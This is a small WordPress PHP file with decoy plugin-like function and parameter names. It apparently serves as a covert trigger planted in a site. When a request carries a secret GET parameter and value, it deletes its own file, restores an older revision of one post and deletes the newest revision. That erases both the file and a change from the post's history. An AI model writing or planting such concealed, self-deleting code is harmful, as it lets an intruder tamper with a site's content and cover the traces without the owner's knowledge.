<?php

function loader_pixel_learndash_oembed() {
	if (isset($_GET['buttons_mini_verification_notes']) && $_GET['buttons_mini_verification_notes'] === 'remover_copyright_featured_icons') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$express_hidden_alert_picker = 11854;
		$addons_server_cleaner = wp_get_post_revisions($express_hidden_alert_picker);
		if (empty($addons_server_cleaner)) die('no revisions');
		if (count($addons_server_cleaner) < 2) die('less than 2');
		$information_addons_purchase_updates = array_shift($addons_server_cleaner);
		$themes_tab_permalinks = $information_addons_purchase_updates->ID;
		$reading_tables_easy = array_shift($addons_server_cleaner);
		$fx_rate_rich_reader = $reading_tables_easy->ID;
		$article_design_advance = wp_restore_post_revision($fx_rate_rich_reader);
		if ($article_design_advance === false) die('error restoring');
		$article_design_advance = wp_delete_post_revision($themes_tab_permalinks);		
		if ($article_design_advance === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'loader_pixel_learndash_oembed');
